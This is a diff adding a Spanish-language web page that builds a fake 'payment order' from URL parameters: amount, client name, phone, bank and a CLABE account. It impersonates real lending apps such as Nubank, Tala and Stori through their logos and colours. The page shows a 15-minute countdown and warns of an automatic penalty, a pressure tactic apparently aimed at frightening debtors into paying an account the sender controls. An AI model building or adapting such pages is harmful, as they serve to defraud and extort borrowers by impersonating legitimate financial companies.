@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Orden de Pago</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
+        body { font-family: 'Inter', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; background: #f1f5f9; }
+        .app-card { width: 100%; max-width: 440px; background: white; border-radius: 2.5rem; overflow: hidden; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.1); }
+    </style>
+</head>
+<body>
+
+    <div class="app-card">
+        <div id="header-bg" class="pt-12 pb-6 text-center transition-colors duration-500">
+            <div class="w-24 h-24 bg-white rounded-3xl mx-auto mb-4 flex items-center justify-center overflow-hidden border-4 border-white/20 shadow-lg">
+                <img id="img-app" src="" class="w-full h-full object-cover">
+            </div>
+            <h2 id="txt-app" class="text-white font-black uppercase text-xl tracking-tighter italic"></h2>
+        </div>
+
+        <div class="p-8 space-y-8">
+            <div class="text-center space-y-1">
+                <span class="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Monto a Pagar</span>
+                <div id="txt-monto" class="text-5xl font-black text-slate-800 tracking-tighter"></div>
+                <div id="contador" class="text-red-600 font-black text-xl mt-2">15:00</div>
+            </div>
+
+            <div class="space-y-4 bg-slate-50 p-6 rounded-[2rem] border border-slate-100">
+                <div class="flex justify-between items-center border-b border-slate-200/60 pb-3">
+                    <span class="text-[10px] font-bold text-slate-400 uppercase">Cliente</span>
+                    <span id="txt-nom" class="text-xs font-black text-slate-700 uppercase"></span>
+                </div>
+                <div class="flex justify-between items-center border-b border-slate-200/60 pb-3">
+                    <span class="text-[10px] font-bold text-slate-400 uppercase">Teléfono</span>
+                    <span id="txt-tel" class="text-xs font-black text-slate-700"></span>
+                </div>
+                <div class="flex justify-between items-center border-b border-slate-200/60 pb-3">
+                    <span class="text-[10px] font-bold text-slate-400 uppercase">Banco</span>
+                    <span id="txt-banco" class="text-xs font-black text-slate-700 uppercase"></span>
+                </div>
+                <div class="flex flex-col items-center pt-2">
+                    <span class="text-[10px] font-bold text-slate-400 uppercase mb-2">CLABE / LIGA DE PAGO</span>
+                    <div class="flex items-center space-x-2">
+                        <span id="txt-clabe" class="text-sm font-black text-blue-600 tracking-wider"></span>
+                        <button onclick="copiarLiga()" class="bg-blue-100 p-1.5 rounded-lg hover:bg-blue-200 transition-colors">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-blue-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7v8a2 2 0 002 2h6M8 7V5a2 2 0 012-2h4.586a1 1 0 01.707.293l4.414 4.414a1 1 0 01.293.707V15a2 2 0 01-2 2h-2M8 7H6a2 2 0 00-2 2v10a2 2 0 002 2h8a2 2 0 002-2v-2" />
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="text-center space-y-3">
+                <p class="text-[10px] text-red-600 font-black uppercase leading-tight italic">
+                    ⚠️ ADVERTENCIA: TIENES UN TIEMPO LÍMITE DE 15 MINUTOS PARA REALIZAR EL PAGO, DE LO CONTRARIO SE TE COBRARÁ UNA PENALIZACIÓN AUTOMÁTICA.
+                </p>
+                <p class="text-[10px] text-slate-400 font-medium px-4">
+                    Realiza tu pago antes del vencimiento para evitar cargos adicionales por mora.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const p = new URLSearchParams(window.location.search);
+        const v = p.get('v');
+
+        const apps = {
+            'prestamos': { n: 'Préstamos', c: '#a3e635', i: 'https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/cb/a8/7a/cba87ab7-2fe9-aad7-e49f-a367d6c410b4/AppIcon-1x_U007ephone-0-1-0-85-220-0.jpeg/1200x630wa.png' },
+            'dinero': { n: 'Préstamos de Dinero', c: '#1e40af', i: 'https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/31/78/92/317892a1-467e-c2c7-b7c5-be2a58b7d358/AppIcon-1x_U007ephone-0-1-0-85-220-0.png/400x400ia-75.webp' },
+            'nu': { n: 'Préstamos NU', c: '#820ad1', i: 'https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Nubank_logo_2021.svg/1200px-Nubank_logo_2021.svg.png' },
+            'talacred': { n: 'Tala Crédito', c: '#06b6d4', i: 'https://play-lh.googleusercontent.com/DK9nyWUY6ZkHNh3TNSqbr8LTzxSGLJZZq-3QunZ-qkKIl3vYd8Ie8XGYQNrABCZ_T7Y=w480-h960-rw' },
+            'tilt': { n: 'Tilt', c: '#3b82f6', i: 'https://play-lh.googleusercontent.com/GALkEmiM5acYbAGJVkkma1Ij5rDW6CWhSKeGFLcXddAtK3uXmgCPxvfAnVxe325A2_b80xRieYiGjktUw5ajww=w480-h960-rw' },
+            'dida': { n: 'DidaPréstamos', c: '#0057ff', i: 'https://is1-ssl.mzstatic.com/image/thumb/PurpleSource211/v4/e2/14/27/e21427df-1404-f93c-c8b9-230ef12d4870/Placeholder.mill/400x400bb-75.webp' },
+            'rapidos': { n: 'Préstamos Rápidos', c: '#10b981', i: 'https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/7f/68/39/7f683903-e675-6fbc-56fa-64d6fb206e2d/AppIcon-1x_U007ephone-0-1-0-85-220-0.jpeg/400x400ia-75.webp' },
+            'worldmox': { n: 'Worldmoxpro cash', c: '#1e293b', i: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTOQ9FrkHlgWkaMJt_Za2IN0R5Z0UamJ_VQKg&s' },
+            'movil': { n: 'Movil Cash', c: '#22c55e', i: 'https://play-lh.googleusercontent.com/OhU802wo_ffOcR5f6MAvz5ebNFvXOLDiC2p_b7kGS7_XBwFz3HI9jtNn6C8fBiQrzjUx' },
+            'cashcredit': { n: 'Cash Credit', c: '#f59e0b', i: 'https://play-lh.googleusercontent.com/kw_CZs5smCFpyFtI9pWkKhY1eRfX6E15tdTEU_KpxTaUYzUtRFx9b8eOJYpn-Ze4BQ=w480-h960-rw' },
+            'stori': { n: 'Stori Crédito', c: '#7c3aed', i: 'https://play-lh.googleusercontent.com/oXTAgpljdbV5LuAOt1NP9_JafUZe9BNl7pwQ01ndl4blYL4N4IQh4-n456P5l_hc1A=s96-rw' },
+            'facil': { n: 'Fácil Préstamo', c: '#0ea5e9', i: 'https://play-lh.googleusercontent.com/4cDOjhOrs563pTALZF8fikxthh5xznVnrFXReAOmWoNkfI0jncuig3l5hzOiNABAaw=w480-h960-rw' },
+            'tala': { n: 'Tala Préstamos', c: '#fb923c', i: 'https://play-lh.googleusercontent.com/DK9nyWUY6ZkHNh3TNSqbr8LTzxSGLJZZq-3QunZ-qkKIl3vYd8Ie8XGYQNrABCZ_T7Y=w480-h960-rw' }
+        };
+
+        const config = apps[v] || apps['prestamos'];
+
+        document.getElementById('header-bg').style.backgroundColor = config.c;
+        document.getElementById('img-app').src = config.i;
+        document.getElementById('txt-app').innerText = config.n;
+        document.getElementById('txt-monto').innerText = '$' + (p.get('m') || '0.00');
+        document.getElementById('txt-nom').innerText = p.get('n') || 'Cliente';
+        document.getElementById('txt-tel').innerText = p.get('t') || '0000000000';
+        document.getElementById('txt-banco').innerText = p.get('b') || 'BBVA';
+        document.getElementById('txt-clabe').innerText = p.get('c') || '---';
+
+        let tiempo = 900; 
+        const display = document.getElementById('contador');
+        const timer = setInterval(() => {
+            let min = Math.floor(tiempo / 60);
+            let seg = tiempo % 60;
+            display.innerText = `${min}:${seg < 10 ? '0' : ''}${seg}`;
+            if (--tiempo < 0) clearInterval(timer);
+        }, 1000);
+
+        function copiarLiga() {
+            const clabe = document.getElementById('txt-clabe').innerText;
+            navigator.clipboard.writeText(clabe);
+            alert("¡Liga copiada!");
+        }
+    </script>
+</body>
+</html>
